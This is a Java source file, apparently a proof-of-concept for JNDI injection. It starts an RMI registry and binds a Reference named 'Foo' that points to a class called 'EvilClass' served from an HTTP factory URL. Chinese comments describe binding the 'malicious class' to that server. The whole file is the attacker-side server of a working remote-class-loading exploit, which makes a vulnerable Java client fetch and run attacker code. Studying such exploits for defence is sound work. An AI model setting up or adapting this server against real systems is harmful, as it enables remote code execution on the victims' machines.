package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import com.sun.jndi.rmi.registry.RegistryContext;
import javax.naming.spi.NamingManager;

public class rmiserver {

    public static void main(String args[]) {

        try {
            Registry registry = LocateRegistry.createRegistry(1099);   //rmi

            String factoryUrl = "http://localhost:80/";
            Reference reference = new Reference("EvilClass","EvilClass", factoryUrl); //将恶意类绑定到指定的服务器url上
            /*
            查看到Reference,并没有实现Remote接口也没有继承 UnicastRemoteObject类
            然而将类注册到Registry需要实现Remote和继承UnicastRemoteObject类
             */
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("Foo", wrapper);                       //将名称绑定到对象上去

            System.err.println("Server ready, factoryUrl:" + factoryUrl);
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
